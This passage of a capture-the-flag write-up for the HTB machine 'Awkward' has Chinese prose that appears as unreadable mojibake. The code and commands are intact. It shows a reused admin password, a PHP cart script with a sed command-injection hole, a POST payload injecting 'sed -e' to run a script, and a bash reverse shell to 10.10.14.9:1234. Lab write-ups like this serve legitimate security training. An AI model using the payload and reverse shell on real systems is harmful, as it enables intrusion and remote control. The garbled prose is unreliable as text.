src="https://pic.imgdb.cn/item/63d5ee3bface21e9efea608d.jpg"></a></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªé…ç½®æ–‡ä»¶æ­£æ˜¯åˆšåˆšçˆ†ç ´çš„å­åŸŸåçš„é…ç½®æ–‡ä»¶ã€‚è¿›å…¥<code>http://store.hat-valley.htb/</code>å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5ee48face21e9efea81d4.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ee48face21e9efea81d4.jpg"></a></p><p>å¯ä»¥åœ¨<code>/etc/nginx/sites-available/store.conf</code>ä¸­çœ‹åˆ°<code>auth_basic_user_file</code>çš„å€¼ä¸º<code>/etc/nginx/conf.d/.htpasswd</code>ï¼Œ<code>auth_basic_user_file</code>é…ç½®æŒ‡å®šä¿å­˜ç”¨æˆ·åå¯†ç çš„æ–‡ä»¶ã€‚</p><p>æŸ¥çœ‹<code>/etc/nginx/conf.d/.htpasswd</code>æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5ee60face21e9efeab145.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ee60face21e9efeab145.jpg"></a></p><p>å…¶ä¸­usernameä¸ºadminï¼Œå¯†ç æ— æ³•çˆ†ç ´ã€‚æˆ‘ä»¬å°†åˆšæ‰ç™»é™†beançš„sshå¯†ç ä½œä¸ºç™»é™†<a href="http://store.hat-valley.htb/%E7%9A%84%E5%AF%86%E7%A0%81%E8%AF%95%E8%AF%95%EF%BC%8C%E5%8D%B3%EF%BC%9A">http://store.hat-valley.htb/çš„å¯†ç è¯•è¯•ï¼Œå³ï¼š</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=admin</span><br><span class="line">password=014mrbeanrules!#P</span><br></pre></td></tr></table></figure><p>æˆåŠŸç™»é™†ã€‚ç•Œé¢å¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5ee93face21e9efeb0f4e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ee93face21e9efeb0f4e.jpg"></a></p><p>åœ¨åˆšåˆšçš„é…ç½®æ–‡ä»¶ä¸­ï¼Œè¿˜å¯ä»¥çœ‹åˆ°ç½‘ç«™æºä»£ç çš„ä½ç½®ä¸º&#x2F;var&#x2F;www&#x2F;storeã€‚å®¡è®¡ç½‘ç«™æºä»£ç ï¼Œå‘ç°<code>cart_actions.php</code>å­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$STORE_HOME</span> = <span class="string">&quot;/var/www/store/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//check for valid hat valley store item</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkValidItem</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="variable">$first_line</span> = <span class="title function_ invoke__">file</span>(<span class="variable">$filename</span>)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$first_line</span>, <span class="string">&quot;***Hat Valley&quot;</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//add to cart</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;add_item&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;item&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$item_id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;item&#x27;</span>];</span><br><span class="line">    <span class="variable">$user_id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    <span class="variable">$bad_chars</span> = <span class="keyword">array</span>(<span class="string">&quot;;&quot;</span>,<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;|&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;$&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;!&quot;</span>,<span class="string">&quot;#&quot;</span>); <span class="comment">//no hacking allowed!!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$bad_chars</span> <span class="keyword">as</span> <span class="variable">$bad</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$item_id</span>, <span class="variable">$bad</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Bad character detected!&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$bad_chars</span> <span class="keyword">as</span> <span class="variable">$bad</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$user_id</span>, <span class="variable">$bad</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Bad character detected!&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">checkValidItem</span>(<span class="string">&quot;<span class="subst">&#123;$STORE_HOME&#125;</span>product-details/<span class="subst">&#123;$item_id&#125;</span>.txt&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;<span class="subst">&#123;$STORE_HOME&#125;</span>cart/<span class="subst">&#123;$user_id&#125;</span>&quot;</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo &#x27;***Hat Valley Cart***&#x27; &gt; <span class="subst">&#123;$STORE_HOME&#125;</span>cart/<span class="subst">&#123;$user_id&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;head -2 <span class="subst">&#123;$STORE_HOME&#125;</span>product-details/<span class="subst">&#123;$item_id&#125;</span>.txt | tail -1 &gt;&gt; <span class="subst">&#123;$STORE_HOME&#125;</span>cart/<span class="subst">&#123;$user_id&#125;</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Item added successfully!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Invalid item&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//delete from cart</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;delete_item&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;item&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$item_id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;item&#x27;</span>];</span><br><span class="line">    <span class="variable">$user_id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    <span class="variable">$bad_chars</span> = <span class="keyword">array</span>(<span class="string">&quot;;&quot;</span>,<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;|&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;$&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;!&quot;</span>,<span class="string">&quot;#&quot;</span>); <span class="comment">//no hacking allowed!!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$bad_chars</span> <span class="keyword">as</span> <span class="variable">$bad</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$item_id</span>, <span class="variable">$bad</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Bad character detected!&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$bad_chars</span> <span class="keyword">as</span> <span class="variable">$bad</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$user_id</span>, <span class="variable">$bad</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Bad character detected!&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">checkValidItem</span>(<span class="string">&quot;<span class="subst">&#123;$STORE_HOME&#125;</span>cart/<span class="subst">&#123;$user_id&#125;</span>&quot;</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;sed -i &#x27;/item_id=<span class="subst">&#123;$item_id&#125;</span>/d&#x27; <span class="subst">&#123;$STORE_HOME&#125;</span>cart/<span class="subst">&#123;$user_id&#125;</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Item removed from cart&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Invalid item&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//fetch from cart</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;GET&#x27;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;fetch_items&#x27;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$html</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&quot;<span class="subst">&#123;$STORE_HOME&#125;</span>cart&quot;</span>);</span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">array_slice</span>(<span class="variable">$dir</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="variable">$user_id</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, -<span class="number">18</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user_id</span> === <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">checkValidItem</span>(<span class="string">&quot;<span class="subst">&#123;$STORE_HOME&#125;</span>cart/<span class="subst">&#123;$user_id&#125;</span>&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$product_file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;<span class="subst">&#123;$STORE_HOME&#125;</span>cart/<span class="subst">&#123;$file&#125;</span>&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">            <span class="variable">$details</span> = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">while</span> ((<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$product_file</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&#x27;&#x27;</span>, <span class="variable">$line</span>) !== <span class="string">&quot;***Hat Valley Cart***&quot;</span>) &#123; <span class="comment">//don&#x27;t include first line</span></span><br><span class="line">                    <span class="title function_ invoke__">array_push</span>(<span class="variable">$details</span>, <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&#x27;&#x27;</span>, <span class="variable">$line</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$details</span> <span class="keyword">as</span> <span class="variable">$cart_item</span>) &#123;</span><br><span class="line">                 <span class="variable">$cart_items</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;&amp;&quot;</span>, <span class="variable">$cart_item</span>);</span><br><span class="line">                 <span class="keyword">for</span>(<span class="variable">$x</span> = <span class="number">0</span>; <span class="variable">$x</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$cart_items</span>); <span class="variable">$x</span>++) &#123;</span><br><span class="line">                      <span class="variable">$cart_items</span>[<span class="variable">$x</span>] = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;=&quot;</span>, <span class="variable">$cart_items</span>[<span class="variable">$x</span>]); <span class="comment">//key and value as separate values in subarray</span></span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="variable">$html</span> .= <span class="string">&quot;&lt;tr&gt;&lt;td&gt;<span class="subst">&#123;$cart_items[1][1]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$cart_items[2][1]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$cart_items[3][1]&#125;</span>&lt;/td&gt;&lt;td&gt;&lt;button data-id=<span class="subst">&#123;$cart_items[0][1]&#125;</span> onclick=\&quot;removeFromCart(this, localStorage.getItem(&#x27;user&#x27;))\&quot; class=&#x27;remove-item&#x27;&gt;Remove&lt;/button&gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é‡ç‚¹æ˜¯è¿™éƒ¨åˆ†ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//delete from cart</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;delete_item&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;item&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$item_id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;item&#x27;</span>];</span><br><span class="line">    <span class="variable">$user_id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    <span class="variable">$bad_chars</span> = <span class="keyword">array</span>(<span class="string">&quot;;&quot;</span>,<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;|&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;$&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;!&quot;</span>,<span class="string">&quot;#&quot;</span>); <span class="comment">//no hacking allowed!!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$bad_chars</span> <span class="keyword">as</span> <span class="variable">$bad</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$item_id</span>, <span class="variable">$bad</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Bad character detected!&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$bad_chars</span> <span class="keyword">as</span> <span class="variable">$bad</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$user_id</span>, <span class="variable">$bad</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Bad character detected!&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">checkValidItem</span>(<span class="string">&quot;<span class="subst">&#123;$STORE_HOME&#125;</span>cart/<span class="subst">&#123;$user_id&#125;</span>&quot;</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;sed -i &#x27;/item_id=<span class="subst">&#123;$item_id&#125;</span>/d&#x27; <span class="subst">&#123;$STORE_HOME&#125;</span>cart/<span class="subst">&#123;$user_id&#125;</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Item removed from cart&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Invalid item&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä¼šè¿‡æ»¤æ‰æˆ‘ä»¬POSTä¼ å…¥çš„<code>item</code>å‚æ•°å’Œ<code>user</code>å‚æ•°ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬æ— æ³•åˆ©ç”¨ç‰¹æ®Šå­—ç¬¦æ¥è¿›è¡Œå‘½ä»¤æ³¨å…¥ã€‚æ¥ç€åˆ©ç”¨<code>checkValidItem</code>å‡½æ•°æ¥åˆ¤æ–­&#x2F;var&#x2F;www&#x2F;store&#x2F;cart&#x2F;{$user_id}æ–‡ä»¶æ˜¯å¦å­˜åœ¨ä¸”è¯¥æ–‡ä»¶çš„å¼€å¤´æ˜¯å¦æœ‰***Hat Valleyå­—æ ·ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//check for valid hat valley store item</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkValidItem</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="variable">$first_line</span> = <span class="title function_ invoke__">file</span>(<span class="variable">$filename</span>)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$first_line</span>, <span class="string">&quot;***Hat Valley&quot;</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»•è¿‡æ˜¯éªŒè¯æˆåŠŸï¼Œå°±ä¼šåˆ©ç”¨systemæ‰§è¡Œä¸€ä¸²å‘½ä»¤ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ»¥ç”¨sedå‘½ä»¤ã€‚sedå‘½ä»¤çš„-eå‚æ•°å…è®¸æˆ‘ä»¬ä¼ é€’è„šæœ¬ã€‚å‡è®¾æˆ‘ä»¬ç¼–å†™çš„shellæ–‡ä»¶å¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5eea4face21e9efeb346d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5eea4face21e9efeb346d.jpg"></a></p><p>é¦–å…ˆncç›‘å¬1235ï¼Œæ¥ç€æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5eeb2face21e9efeb4d8f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5eeb2face21e9efeb4d8f.jpg"></a></p><p>ç»“æœå¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5eebfface21e9efeb663e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5eebfface21e9efeb663e.jpg"></a></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç¼–å†™çš„shellç¡®å®è¢«æ‰§è¡Œäº†ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å†™å…¥ä¸€ä¸ªshellæ–‡ä»¶ï¼Œå¹¶æ„é€ itemä½¿å¾—è¯¥shellæ–‡ä»¶è¢«æ‰§è¡Œã€‚é¦–å…ˆç¼–å†™&#x2F;tmp&#x2F;1.shï¼Œå†…å®¹ä¸ºåå¼¹shellçš„bashå‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bean@awkward:/tmp$ echo &#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.9/1234 0&gt;&amp;1&quot;&#x27; &gt; 1.sh</span><br><span class="line">bean@awkward:/tmp$ chmod +x 1.sh</span><br></pre></td></tr></table></figure><p>æ¥ç€æˆ‘ä»¬æ·»åŠ ä¸€ä¸ªåˆæ³•çš„hat valley store itemï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5eed1face21e9efeb87a0.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5eed1face21e9efeb87a0.jpg"></a></p><p>æ¥ç€ä¼ å…¥POSTå¦‚ä¸‹payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=delete_item&amp;item=&#x27; -e &#x27;1e /tmp/1.sh&#x27; /tmp/1.sh &#x27;&amp;user=1</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‰§è¡Œ&#x2F;tmp&#x2F;1.shï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5eedfface21e9efeba526.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5eedfface21e9efeba526.jpg"></a></p><p>æ¥ç€æˆ‘ä»¬ä¸Šä¼ pspyç›‘æ§ä¸€ä¸‹è¿›ç¨‹ï¼Œå‘ç°ç³»ç»Ÿåœ¨åˆ©ç”¨<code>inotifywait</code>ç›‘æ§&#x2F;var&#x2F;www&#x2F;private&#x2F;leave_requests.csvæ–‡ä»¶ï¼š</p><p><a href="https://pic.imgdb.cn/item/63d5eeedface21e9efebc0b9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5eeedface21e9efebc0b9.jpg"></a></p><p>è¿™é‡Œä»‹ç»ä¸€ä¸‹inotifywaitçš„å¸¸ç”¨å‚æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">--timefmt æ—¶é—´æ ¼å¼</span><br><span class="line">    %yå¹´ %mæœˆ %dæ—¥ %Hå°æ—¶ %Måˆ†é’Ÿ</span><br><span class="line">--format è¾“å‡ºæ ¼å¼</span><br><span class="line">    %Tæ—¶é—´ %wè·¯å¾„ %fæ–‡ä»¶å %eçŠ¶æ€</span><br><span class="line"> 